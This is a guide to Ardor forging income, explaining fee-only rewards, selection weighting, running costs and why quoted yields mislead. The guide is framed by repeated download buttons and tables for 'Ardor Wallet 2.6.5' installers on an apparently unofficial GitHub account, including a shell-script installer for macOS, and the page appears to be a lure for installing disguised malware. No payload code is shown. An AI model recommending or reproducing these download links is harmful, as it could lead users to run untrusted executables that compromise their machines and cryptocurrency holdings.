![Ardor Wallet guide](assets/banner-article.png)

# What forgers actually earn, and what they do not

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Forgers earn the transaction fees inside the blocks they produce. There is no block reward, no issuance and no advertised yield, so the income depends entirely on how much fee activity the chain carries and how often your weight is selected. Anyone quoting a percentage return for Ardor is describing a mechanism the protocol does not have.

## Where the money comes from

Every transaction pays a fee. On the parent chain that fee is paid in ARDR by the sender; on a child chain it is paid in the [Ardor child chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md)'s token to a bundler, which then pays ARDR to include the bundle. Either way, the ARDR that reaches a forger comes from users, not from new coins.

That is the single most important fact about [forging](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md) economics. The supply is fixed, so the reward pool is a share of existing coins moving around the network rather than a subsidy paid for security. A quiet chain pays little; a busy chain pays more. Neither outcome is a promise.

## What decides your share

Selection is weighted by effective [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md), so your income is a function of your weight against everyone else's, not of the machine you run.

| Factor | Effect on income |
|---|---|
| Effective balance | More weight, more expected blocks |
| Total network weight | More competition, fewer expected blocks per unit of stake |
| Fee activity | More transactions, more fees per block |
| Uptime | A node that is off cannot be selected |

Two accounts with identical balances on identical hardware earn the same in expectation. One with a faster processor earns nothing extra, which is the practical difference between forging and mining.

## What a realistic expectation looks like

There is no number to quote, and any figure presented as typical should be treated with suspicion. Expected income is your share of total weight multiplied by total fees collected over the period, minus whatever you pay to run the [Ardor node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md).

That formula is worth internalising because it makes the variables obvious. If you hold a small fraction of the total weight, your expected blocks are rare, and a month with no block is not a malfunction. If the chain's fee activity is low, even a large weight produces modest income.

## The costs that eat into it

- Electricity for an always-on machine, which is the same cost as running any desktop continuously.
- Hardware you would not otherwise keep, if the node needs a dedicated machine.
- Your time for updates, since a mandatory fork requires the node to be current.
- The opportunity cost of the ARDR itself, which is committed to the balance either way.

For a small balance those costs can exceed the fees, which is why leasing exists: the same weight, somebody else's electricity bill.

## Why APY figures mislead

A percentage return implies a fixed rate applied to a balance. Forging has no rate. It has a lottery with weighted tickets and a prize pool that varies with network activity, so an annualised figure is either a guess dressed as a fact or a number borrowed from a different product.

The comparison is especially misleading because staking products on other chains often do pay an issuance reward, sometimes at a published rate. Ardor's mechanism has no such component, and a page that presents one is either confusing the two models or selling something else.

A useful test is to ask what happens in a month with no transactions. Under a rate, the payout continues. Under a fee model, it falls to nothing, which is exactly what the protocol describes.

## Comparing two operators

Two leasing offers are rarely written the same way, so a like-for-like comparison means asking the same four questions of each. What share of the fees is paid, paid in what, on what schedule, and on what evidence?

A share paid in the child chain token is not the same as a share paid in ARDR, and a monthly payout is not the same as one at the end of a term. Ask for the last term's record rather than a projection: a history of payments is checkable, and a forecast is not.

The fourth question matters most. An operator who cannot say how the payout is calculated, or who changes the answer when asked twice, is offering an arrangement rather than a service, and an arrangement with no evidence behind it is worth exactly what the other party's goodwill is worth on the day it is tested.

## Reporting and records

Forging income is income, and the wallet's transaction history is the record of it. If you report it, export the transactions for the period and keep them with your own notes on the fee value at the time.

Nothing in the wallet computes a tax figure for you, and no rate is attached to the fees when they arrive. The record is what the chain says, and the accounting is yours.

## FAQ

### Is there a block reward in Ardor?

No. Forgers receive the transaction fees in the blocks they produce, and no new coins are created.

### Can I estimate my monthly forging income?

Only as a rough calculation: your share of total effective weight times the fees collected in the period. There is no fixed rate, and a month with no block is normal for a small balance.

### Does leasing earn a fixed return?

No. A lease gives your weight to another account. Any payout is an arrangement between the two of you, not a protocol feature, and it is not enforced by the chain.

### Why did I forge nothing for weeks?

Because selection is weighted and random within the weights. A small share produces long gaps, and that is expected behaviour rather than a fault.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What forging means on Ardor, and why it is not mining](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md)
- [Start forging ARDR in the wallet, and why it may not start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/start-forging-in-the-ardor-wallet.md)
- [Lease ARDR and earn fees without running a node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/lease-ardr-without-a-node-in-ardor-wallet.md)
- [Track Ardor holdings in fiat and report the tax](https://github.com/ardor-software/ardor-wallet-guides/blob/main/track-ardor-in-fiat-and-report-tax.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
